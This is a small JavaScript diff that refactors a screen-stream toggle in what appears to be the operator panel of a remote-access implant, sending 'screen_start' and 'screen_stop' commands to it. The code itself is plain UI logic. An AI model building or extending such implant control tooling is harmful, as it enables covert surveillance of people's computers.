@@ -491,14 +491,16 @@
         }
 
         function toggleStream() {
-            const btn = document.getElementById('btn-stream');
-            if(!btn) return;
-            if(btn.innerText === "Start Stream") {
-                btn.innerText = "Stop Stream";
+            isStreaming = !isStreaming;
+            
+            if (isStreaming) {
                 sendImplantCmd('screen_start');
             } else {
-                btn.innerText = "Start Stream";
                 sendImplantCmd('screen_stop');
+                const img = document.getElementById('live-screen-img');
+                const icon = document.getElementById('live-screen-icon');
+                if (img) img.style.display = 'none';
+                if (icon) icon.style.display = 'block';
             }
         }
 
